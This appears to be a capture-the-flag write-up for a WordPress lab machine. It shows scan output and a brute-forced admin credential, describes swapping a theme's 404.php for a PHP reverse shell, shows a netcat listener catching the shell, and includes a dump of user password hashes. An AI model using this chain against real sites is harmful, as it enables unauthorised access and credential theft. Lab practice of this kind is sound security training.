```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-01 14:24 PST
Nmap scan report for 10.10.160.150
Host is up (0.15s latency).
Not shown: 4998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.98 seconds

```

feroxbuster
```

301        9l       28w      315c http://10.10.160.150/hidden
301        0l        0w        0c http://10.10.160.150/index.php
200      385l     3179w    19930c http://10.10.160.150/license.txt
200       95l      835w     7173c http://10.10.160.150/readme.html
200       13l       39w      340c http://10.10.160.150/hidden/index.html
301        9l       28w      317c http://10.10.160.150/wp-admin
301        9l       28w      319c http://10.10.160.150/wp-content
301        9l       28w      320c http://10.10.160.150/wp-includes
200        0l        0w        0c http://10.10.160.150/wp-includes/bookmark.php
200        0l        0w        0c http://10.10.160.150/wp-includes/cache.php
301        9l       28w      333c http://10.10.160.150/wp-includes/certificates
301        9l       28w      321c http://10.10.160.150/wp-admin/css
200        0l        0w        0c http://10.10.160.150/wp-includes/category.php
200        0l        0w        0c http://10.10.160.150/wp-includes/comment.php
200        0l        0w        0c http://10.10.160.150/wp-includes/compat.php
301        9l       28w      324c http://10.10.160.150/wp-includes/css
200        0l        0w        0c http://10.10.160.150/wp-includes/cron.php
200        0l        0w        0c http://10.10.160.150/wp-includes/date.php
301        9l       28w      324c http://10.10.160.150/wp-admin/images
200        0l        0w        0c http://10.10.160.150/wp-content/index.php
301        9l       28w      326c http://10.10.160.150/wp-admin/includes
301        9l       28w      326c http://10.10.160.150/wp-includes/fonts
200        0l        0w        0c http://10.10.160.150/wp-includes/feed.php
301        9l       28w      329c http://10.10.160.150/wp-content/languages
301        9l       28w      323c http://10.10.160.150/wp-admin/maint
```

10.10.160.150/hidden
```
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```

wpscan
```
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.160.150/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.160.150/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.160.150/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.160.150/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.160.150/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.160.150/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://10.10.160.150/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://10.10.160.150/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.160.150/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <====================================> (137 / 137) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```

```
[!] Valid Combinations Found:
 | Username: C0ldd, Password: 9876543210

```

Login as C0ldd, go to editor and find 404.php. Replace page contents with php reverse shell, save and update the page, then access it with `10.10.10.86/?p=404.php`.

```
└─$ nc -nvlp 1111
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1111
Ncat: Listening on 0.0.0.0:1111
Ncat: Connection from 10.10.10.86.
Ncat: Connection from 10.10.10.86:40544.
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:14:23 up 14 min,  0 users,  load average: 0.00, 0.11, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

```
MariaDB [colddbox]> select * from wp_users;
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
| ID | user_login | user_pass                          | user_nicename | user_email           | user_url | user_registered     | user_activation_key | user_status | display_name       |
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
|  1 | c0ldd      | $P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1 | c0ldd         | c0ldd@localhost.com  |          | 2020-09-24 15:06:57 |                     |           0 | the cold in person |
|  2 | hugo       | $P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/ | hugo          | hugo@localhost.com   |          | 2020-09-24 15:48:13 |                     |           0 | hugo               |
|  4 | philip     | $P$BXZ9bXCbA1JQuaCqOuuIiY4vyzjK/Y. | philip        | philip@localhost.com |          | 2020-10-19 17:38:25 |                     |           0 | philip             |
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
3 rows in set (0.00 sec)

```
